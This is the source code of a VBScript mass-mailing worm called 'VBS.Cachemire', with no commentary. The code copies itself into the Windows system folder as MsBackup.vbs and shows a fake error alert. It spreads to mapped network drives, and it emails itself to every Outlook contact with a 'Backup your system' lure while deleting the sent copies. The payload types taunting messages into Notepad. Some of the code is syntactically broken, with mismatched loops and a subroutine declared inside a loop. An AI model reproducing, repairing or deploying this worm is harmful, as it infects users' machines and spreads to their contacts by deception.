'VBS.Cachemire
'On error resume next

fs="FileSystemObject"
sc="Scripting"
wsc="WScript"
sh="Shell"
nt="Network"
crlf=Chr(13)&Chr(10)

Set fso=CreateObject(sc & "." & fs)
Set ws=CreateObject(wsc & "." & sh)
Set ntw=CreateObject(wsc & "." & nt)
Set win=fso.GetSpecialFolder(0)
Set sys=fso.GetSpecialFolder(1)
Set tmp=fso.GetSpecialFolder(2)
desk=ws.SpecialFolders("Desktop")
strp=ws.SpecialFolders("StartUp")


Set fl=fso.OpenTextFile(WScript.ScriptFullName,1)
wrm=fl.ReadAll
fl.Close


If WScript.ScriptFullName <> sys&"\MsBackup.vbs" Then

MsgBox "Sorry but the file """ & WScript.ScriptName & """ is not a valid VBS file",vbcritical,"ALERT"
fso.GetFile(WScript.ScriptFullName).Copy(sys&"\MsBackup.vbs")
'ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\MsBackup",sys&"\MsBackup.vbs"

netn=""
For cnt = 1 To 8
netn=netn & Chr(Int(Rnd(1) * 26) + 97)
Next
netn = netn & ".vbs"
msgbox netn
Loop
spreadnetwrk(netn)

set lnk = ws.CreateShortcut(desk & "\Surprise.lnk")
lnk.TargetPath = sys&"\MsBackup.vbs"
lnk.WindowStyle = 1
lnk.Hotkey = "CTRL+SHIFT+F"
lnk.IconLocation = "wscript.exe, 0"
lnk.Description = "Surprise"
lnk.WorkingDirectory = sys
lnk.Save

Else

y=0

Do Until y=Day(Now)
Sub spreadout()
y=y+1
Loop

If Day(Now) = Int((31 * Rnd) + 1) Then
ws.Run "notepad.exe"
wscript.Sleep 200
ws.SendKeys "Date : " & date & vbLf
ws.SendKeys "Time : " & time & crlf
x = 0
Do Until x=6
num = Int((6 * Rnd) + 1)
If num = 1 Then
mess = "You're infected by my new VBS virus. " & VbLf & "Don't panic, it's not Dangerous" & vbCrlf
ElseIf num = 2 Then mess = "Why do you click unknown file ??" & crlf
ElseIf num = 3 Then mess = "A new creation coded by PetiK/[b8]" & crlf
ElseIf num = 4 Then mess = "Contact an AV support to disinfect your system" & crlf
ElseIf num = 5 Then mess = "Be careful next time" & crlf
ElseIf num = 6 Then mess = "Curiosity is bad" & crlf
End If
For i = 1 to Len(mess)
ws.SendKeys Mid(mess,i,1)
wscript.Sleep 50
Next
x=x+1
Loop
End If

End If

Sub spreadnetwrk(nname)
Set drve = ntw.EnumNetworkDrives
If drve.Count > 0 Then
For j = 0 To drve.Count -1
If drve.Item(j) <> "" Then
fso.GetFile(WScript.ScriptFullName).Copy(drve.Item(j) & "\" & nname)
End If
Next
End If
End Sub

Sub spreadout()
Set A=CreateObject("Outlook.Application")
Set B=A.GetNameSpace("MAPI")
For Each C In B.AddressLists
If C.AddressEntries.Count <> 0 Then
For D=1 To C.AddressEntries.count
Set E=C.AddressEntries(D)
Set F=A.CreateItem(0)
F.To=E.Address
F.Subject="Backup your system..."
F.Body="Use this tool to create a backup of your system..."
Set G=CreateObject("Scripting.FileSystemObject")
F.Attachments.Add(sys&"\MsBackup.vbs")
F.DeleteAfterSubmit=True
If F.To <> "" Then
F.Send
End If
Next
End If
Next
End Sub